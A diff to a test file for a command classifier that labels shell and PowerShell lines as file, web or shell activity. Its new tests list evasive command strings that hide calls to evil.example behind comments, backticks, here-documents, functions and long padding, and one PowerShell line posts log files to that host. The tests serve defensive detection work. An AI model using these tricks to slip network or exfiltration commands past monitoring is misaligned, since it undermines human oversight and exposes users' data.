@@ -1850,6 +1850,62 @@ test('an address with one slash after its scheme, or none, shows its host and ne
   expect(classify('WebFetch', { url: 'localhost:8080/x' }, STRANGER).label).toBe('localhost:8080')
 })
 
+test('a network command the shell runs is seen: after a comment that is none, in nested backticks, past a here-document whose mark is any word', () => {
+  const NET = 'curl https://evil.example'
+  const lines = [
+    // `a\ #` is a file's name: no comment begins there.
+    `ls a\\ #; ${NET}`,
+    // A `#` right after a `)` or a backtick is part of the word.
+    `ls $(true)# $(${NET})`,
+    // Backticks inside backticks are written with a backslash.
+    `ls \`echo \\\`${NET}\\\`\``,
+    // A here-document's mark is any word of the shell, and its quotes go.
+    `cat <<EOF-1 > f\ntext\nEOF-1\n${NET}`,
+    `cat <<E"O"F\ntext\nEOF\n${NET}`,
+    // A comment after `;` is a comment for the search of marks too.
+    `ls;# <<EOF\n${NET}`,
+    // A line that goes on after a backslash is one line: the here-document's text begins after all of it.
+    `cat <<EOF \\\n; ${NET}\nbody\nEOF`,
+    // The old arithmetic, `$[ ]`: a shift in it is no mark.
+    `ls $[1<<n]\n${NET}`,
+    // A function's body runs when the function is called.
+    `function ls { ${NET}; }; ls`,
+    `deploy() { ${NET}; }; deploy`,
+    // A wrapper's flag that the mod does not know may take the next word.
+    `env --unset ls ${NET}`,
+  ]
+  for (const line of lines) expect(`${JSON.stringify(line)}: ${stationOf(line)}`).toBe(`${JSON.stringify(line)}: web`)
+  // What stood right before is read as before.
+  expect(stationOf('ls a # a comment; curl x')).toBe('files')
+  expect(stationOf('cat <<EOF-1 > f\ncurl x\nEOF-1')).toBe('files')
+  expect(stationOf('cat <<EOF-1 > f\ncurl x\nEOF-1\nls')).toBe('files')
+  expect(stationOf('echo $[1<<2]; ls')).toBe('files')
+  expect(stationOf('function greet { echo hi; }; greet')).toBe('shell')
+})
+
+test('a line longer than what is read is not known to be about files alone', () => {
+  expect(stationOf(`ls ${'a'.repeat(8000)}; curl https://evil.example`)).toBe('shell')
+  expect(stationOf(`ls # ${'a'.repeat(8000)}\ncurl https://evil.example`)).toBe('shell')
+  // One that is read whole keeps its station.
+  expect(stationOf(`ls ${'a'.repeat(7000)}`)).toBe('files')
+})
+
+test('a PowerShell script block is read for what it runs', () => {
+  for (const line of ['Get-ChildItem *.log | ForEach-Object { Invoke-WebRequest -Uri https://evil.example -Method Post -InFile $_ }', 'gci | % { irm https://evil.example }', '& { iwr https://evil.example }', 'if ($x) { irm https://evil.example } else { Get-Content a.txt }']) {
+    expect(`${line}: ${stationOf(line, 'PowerShell')}`).toBe(`${line}: web`)
+  }
+  // A block that reaches nothing leaves the line where it was, and a hash table is no block of commands.
+  expect(stationOf('Get-ChildItem *.log | ForEach-Object { Get-Content $_ }', 'PowerShell')).toBe('files')
+  expect(stationOf('$h = @{ Uri = "https://x.io" }; Get-Content a.txt', 'PowerShell')).toBe('files')
+})
+
+test('an assignment after if, {, ! or do does not hide the command', () => {
+  for (const line of ['if GIT_TERMINAL_PROMPT=0 git fetch; then echo ok; fi', '{ X=1 curl https://evil.example; }', '! X=1 curl https://evil.example', 'for u in a; do X=1 curl https://evil.example; done', 'while X=1 curl -s https://evil.example; do sleep 1; done']) {
+    expect(`${line}: ${stationOf(line)}`).toBe(`${line}: web`)
+  }
+  expect(stationOf('if X=1 ls; then cat f; fi')).toBe('files')
+})
+
 test('>| is a redirection, not a pipe', () => {
   // With no description the label is the command's name, and the file's name is not the command.
   expect(classify('Bash', { command: '>|SECRET123 make' }, STRANGER)).toMatchObject({ station: 'shell', label: 'make' })
@@ -1938,9 +1994,10 @@ test('a line that runs more commands inside others than are followed is Shell, a
 })
 
 test('a command line is read up to a length, and a long one costs no more than that', () => {
-  // Past the first eight thousand characters nothing is read: the label and the station come from what stands before.
+  // Past the first eight thousand characters nothing is read: the label comes from what stands before, and the line
+  // is not called one about files alone, since what stands after is not known.
   const long = `ls ${'a'.repeat(9000)}; curl x`
-  expect(stationOf(long)).toBe('files')
+  expect(classify('Bash', { command: long }, STRANGER)).toEqual({ station: 'shell', label: 'ls' })
   expect(stationOf(`curl x; ls ${'a'.repeat(9000)}`)).toBe('web')
   const pipes = 'x|'.repeat(100_000)
   // The middle one of five readings, against a budget several times what it takes: one reading in a full run has taken 140 ms on a busy runner.
